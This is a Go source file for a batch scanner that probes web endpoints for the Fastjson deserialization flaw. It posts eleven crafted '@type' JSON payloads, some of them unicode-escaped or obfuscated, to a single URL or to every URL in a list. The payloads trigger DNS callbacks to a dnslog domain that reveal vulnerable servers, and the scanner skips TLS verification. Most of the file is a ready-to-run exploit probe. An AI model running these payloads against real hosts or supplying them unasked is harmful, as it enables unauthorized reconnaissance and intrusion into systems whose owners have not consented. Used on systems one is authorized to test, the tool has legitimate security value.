package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)
var url_list[] string

func main(){
	start := time.Now()
	v()
	var dns string
	var ipFile string
	var url string
	flag.StringVar(&ipFile,"f","url.txt","urls file")
	flag.StringVar(&url,"u","http://127.0.0.1","url")
	flag.StringVar(&dns,"dns","dns.log","dnslog")
	flag.Parse()

	if len(os.Args) == 1{
		fmt.Println("use: " +os.Args[0] +  " " + "-f urlfile"+ "   批量检测")
		fmt.Println("use: " + os.Args[0] + " " + "-u url" + "   单独url检测")
		os.Exit(0)
	}else if ipFile != ""{
		array := list(ipFile)
		num := len(array) - 1
		for i,v := range array {
			fmt.Println(strconv.Itoa(i) + "/" + strconv.Itoa(num) + "   "+ "Cracking: "+ v)
			FastjsonScan(v,dns)
		}
	} else if url != ""{
		fmt.Println("Cracking: " + url)
		FastjsonScan(url,dns)
	}else {
		fmt.Println("")
		fmt.Println("usage: " +os.Args[0] +  " " + "-f urlfile"+ "   批量检测")
		fmt.Println("usage: " + os.Args[0] + " " + "-u url" + "   单独url检测")
		os.Exit(0)
		os.Exit(0)
	}
	end := time.Now()
	fmt.Println("用时:", end.Sub(start), "秒")
}

func FastjsonScan(url string,dns string){
	ur := strings.Split(url, "//")[1]
	ur1 := strings.Split(ur, "/")[0]
	if strings.Contains(ur1, ":"){
		ur1 = strings.Replace(ur1, ":", ".", -1)
	}
	dns = ur1 +"." +dns
	//fmt.Println(dns)
	var poc [11]string
	poc[0] = "{\"@type\":\"java.net.Inet4Address\",\"val\":\"" + dns + "\"}"
	poc[1] = "{\"@type\":\"java.net.Inet6Address\",\"val\":\"" + dns + "\"}"
	poc[2] = "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"" + dns + "\"}}"
	poc[3] = "{\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"" + dns + "\"}}\"\"}"
	poc[4] = "{{\"@type\":\"java.net.URL\",\"val\":\"" +dns + "\"}:\"aaa\"}"
	poc[5] = "Set[{\"@type\":\"java.net.URL\",\"val\":\"" + dns + "\"}]"
	poc[6] = "Set[{\"@type\":\"java.net.URL\",\"val\":\"" + dns + "\"}"
	poc[7] = "{{\"@type\":\"java.net.URL\",\"val\":\"" + dns + "\"}:0"
	poc[8] = "{\"a\":{\"@type\": \"java.lang.AutoCloseable\", \"@type\":\"java.io.Reader\"},\"rand1\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"" + dns + "\"}}}"
	poc[9] = `{"\u0040t\u0079pe":"\u006a\u0061\u0076\u0061.\u006e\u0065\u0074.\u0049\u006e\u0065\u0074\u0034\u0041\u0064\u0064\u0072\u0065\u0073\u0073\","\u0076\u0061\u006c\":"` + dns + `"}`
	poc [10] = `{"@type":\b"java.net.Inet4Address","val":"` + dns + `"}`
	startscan(url,poc[0])
	go startscan(url,poc[1])
	go startscan(url,poc[2])
	go startscan(url,poc[3])
	go startscan(url,poc[4])
	go startscan(url,poc[5])
	go startscan(url,poc[6])
	go startscan(url,poc[7])
	go startscan(url,poc[8])
	go startscan(url,poc[9])
	go startscan(url,poc[10])
}

func startscan(url string,poc string){
	var req *http.Request
	post := poc
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	req,_ = http.NewRequest("POST",url,strings.NewReader(post))
	req.Header.Set("Accept", "*/*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
	req.Header.Set("Accept-Encoding", "gzip,deflate")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Connection", "close")
	resp,err := client.Do(req)
	if err != nil{
		fmt.Println(url + "-- request fail")
		return
	}
	defer resp.Body.Close()
}

func list(urlfile string) []string{
	url_file ,err := os.Open(urlfile)
	if err !=nil {
		fmt.Println("Can't open urlfile")
	}
	defer url_file.Close()
	reader_Url := bufio.NewReader(url_file)
	for {
		url ,err := reader_Url.ReadString('\n')
		url = strings.Replace(url, " ", "", -1)
		url = strings.Replace(url, "\n", "", -1)
		url = strings.Replace(url, "\r", "", -1)
		url_list = append(url_list, url)
		if err == io.EOF {
			break
		}
	}
	return url_list
}
func v(){
	fmt.Println("              _                                     _                     _       ")
	fmt.Println("             | |                             _     ( )     _             | |      ")
	fmt.Println("  ____   ____| |__   ___  ____  _____  ___ _| |_   |/    _| |_ ___   ___ | |  ___ ")
	fmt.Println(" |    \\ / ___)  _ \\ / _ \\|  _ \\| ___ |/___|_   _)       (_   _) _ \\ / _ \\| | /___)")
	fmt.Println(" | | | | |   | | | | |_| | | | | ____|___ | | |_          | || |_| | |_| | ||___ |")
	fmt.Println(" |_|_|_|_|   |_| |_|\\___/|_| |_|_____|___/   \\__)          \\__)___/ \\___/ \\_|___/ ")
	fmt.Println("===================================================================================")
}